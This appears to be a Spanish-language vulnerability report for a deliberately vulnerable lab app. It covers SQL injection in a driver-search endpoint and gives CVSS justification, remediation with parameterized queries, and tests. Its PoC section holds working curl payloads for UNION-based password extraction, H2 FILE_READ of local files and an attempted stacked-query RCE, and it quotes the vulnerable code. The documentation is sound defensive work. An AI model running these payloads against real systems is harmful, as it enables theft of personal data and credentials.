| Campo | Valor |
|---|---|

| **Severidad** | 🟠 **HIGH** |

## Affected

- **Endpoint:** `GET /api/drivers/search?q=`
- **Componente:** [`app/src/main/java/co/fleetsec/vapp/web/DriverController.java:63-66`](../../app/src/main/java/co/fleetsec/vapp/web/DriverController.java#L63-L66)
- **Método:** `DriverController.search(@RequestParam String q)`
- **Sink:** `org.springframework.jdbc.core.JdbcTemplate.queryForList(String)` — ejecuta **un solo statement**
- **Backend:** H2 (in-memory, tabla `drivers` con PII de conductores)

## Description

El endpoint de búsqueda construye la sentencia SQL **concatenando directamente** el parámetro `q` controlado por el usuario, sin parametrización ni escape:

```java
// DriverController.java:63-66
String sql = "SELECT id, username, full_name, cedula, email, phone, license_number, role "
        + "FROM drivers WHERE full_name LIKE '%" + q + "%' OR cedula LIKE '%" + q + "%'";
List<Map<String, Object>> rows = jdbc.queryForList(sql);
```

Un valor de `q` con comillas simples rompe el literal de la cláusula `LIKE` y permite alterar la lógica (boolean-based) e inyectar `UNION SELECT` para leer datos arbitrarios del esquema y, vía la función built-in `FILE_READ` de H2, archivos locales del contenedor. La inyección se sirve **sin autenticación** (la app no tiene filtro de seguridad). No es la definición genérica de CWE-89: es la concatenación literal de `q` en `DriverController.search()`.

## CVSSv3.1 — justificación métrica por métrica

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` → **7.5 (High)**

> Criterio: se puntúa **lo demostrado en el PoC**, no capacidades teóricas.

| Métrica | Valor | Justificación en NUESTRA app (demostrada) |
|---|---|---|
| **AV** Attack Vector | **N** (Network) | `/api/drivers/search` se sirve por HTTP; explotable de forma remota. |
| **AC** Attack Complexity | **L** (Low) | Sin condiciones especiales ni race: basta enviar el payload en `q`. Reproducible al 100%. |
| **PR** Privileges Required | **N** (None) | La app **no impone autenticación** (sin Spring Security filter chain); endpoint público. |
| **UI** User Interaction | **N** (None) | El atacante ejecuta directamente. |
| **S** Scope | **U** (Unchanged) | La inyección opera sobre la base H2 y el proceso de la app — misma authority de seguridad. La lectura de archivos vía `FILE_READ` sigue siendo con los privilegios del propio proceso, sin cruzar a otra authority. |
| **C** Confidentiality | **H** (High) | **Demostrado:** extracción de PII de todos los conductores + passwords en claro (UNION) + lectura de archivos locales (`FILE_READ`). |
| **I** Integrity | **N** (None) | **Demostrado ausente:** el sink `queryForList` ejecuta un solo statement; los intentos de `UPDATE`/`CREATE ALIAS` stacked fallan (HTTP 500, sin efecto). No hay escritura desde este punto de inyección. |

**Score = 7.5, no 9.8:** el path `CREATE ALIAS AS <java> → RCE` (con impacto I:H/A:H) requiere **stacked queries**, que este sink **bloquea** — verificado ejecutándolo (ver PoC test 4). Se documenta como escalada posible-pero-bloqueada en *Impact*, no en el score.

## PoC

> Base: [`app/smoke-tests.http`](../../app/smoke-tests.http). Ejecutado sobre `docker compose up` el 2026-08-02.

**Test 1 — Boolean-based, extracción de PII** _(2026-08-02T00:51:39Z)_. Payload `' OR '1'='1` fuerza la condición a verdadera:


**Test 2 — UNION, extracción de passwords en claro** _(2026-08-02T02:30Z)_. Confirma lectura arbitraria de columnas:

```bash
curl -s "http://localhost:8080/api/drivers/search?q=' UNION SELECT NULL,password,NULL,NULL,NULL,NULL,NULL,NULL FROM drivers --"
```
```json
[{"USERNAME":"Bogota2026"},{"USERNAME":"Medellin2026"},{"USERNAME":"admin123"}]   // ← passwords en la columna 'password'
```

**Test 3 — `FILE_READ`, lectura de archivo local del contenedor** _(2026-08-02T02:30Z)_:

```bash
curl -s "http://localhost:8080/api/drivers/search?q=' UNION SELECT NULL,FILE_READ('/etc/hostname',NULL),NULL,NULL,NULL,NULL,NULL,NULL --"
```
```json
[{"USERNAME":"7375deff774f\n"}]   // ← contenido de /etc/hostname (hostname del contenedor)
```

**Test 4 — Stacked query (RCE) → BLOQUEADO** _(evidencia de I:N/A:N)_:

```bash
curl -s "http://localhost:8080/api/drivers/search?q='; CREATE ALIAS X AS 'int y(){return 1;}'; --"
# → HTTP 500, el alias NO se crea. El mismo resultado con '; UPDATE drivers SET role='ADMIN'; --
```
El sink de un solo statement rechaza el stacking → sin escritura ni ejecución de código desde este punto.

### Evidencia adicional del pipeline (doble fuente)

- **SAST (Semgrep):** `tainted-sql-string` (ERROR) en `DriverController.java:63` + `spring-sqli` (WARNING) en `:66`. SARIF en Code Scanning.
- **DAST (OWASP ZAP):** `SQL Injection [40018]` riesgo **High** sobre `GET /api/drivers/search?q='`.

## Impact

- **Confidencialidad (Alta) — demostrada:** exfiltración de PII de todos los conductores + **passwords en claro** + lectura de archivos arbitrarios del contenedor (`FILE_READ`).
- **Integridad / Disponibilidad — no demostradas:** el sink `queryForList` bloquea stacked queries.
- **Escalada posible (NO demostrada, fuera de score):** H2 permite `CREATE ALIAS AS <código Java> → RCE`. Requiere stacked queries, que este sink bloquea. Si la remediación introdujera un sink que permita múltiples statements, el vector escalaría a RCE (I:H/A:H, ~9.8). Se documenta como riesgo latente.
- **Ley 1581 de 2012 (PDP Colombia):** la PII extraída (cédula, teléfono, email, licencia — de ~60.000 conductores en producción) y las credenciales constituyen una **violación de datos personales**: notificación a la SIC y sanciones. Dato bajo el principio de seguridad (Art. 4, lit. g).

## Remediation

Usar **consultas parametrizadas** (placeholders de `JdbcTemplate`), nunca concatenación:

```java
// DESPUÉS (parametrizado — el input nunca es código)
String sql = "SELECT id, username, full_name, cedula, email, phone, license_number, role "
        + "FROM drivers WHERE full_name LIKE ? OR cedula LIKE ?";
String like = "%" + q + "%";
List<Map<String,Object>> rows = jdbc.queryForList(sql, like, like);
```

Controles complementarios: validación de entrada de `q`, usuario de BD con solo `SELECT` sobre las tablas necesarias, y deshabilitar `FILE_READ`/aliases Java en H2 (o migrar de motor).

**Test dual (FSEC-17):**
1. **Rechazo del payload:** `q=' UNION SELECT ...` NO devuelve columnas ajenas (la comilla se trata como dato); la respuesta es la búsqueda literal.
2. **Flujo legítimo OK:** `q=Ana` devuelve exactamente "Ana Pérez".
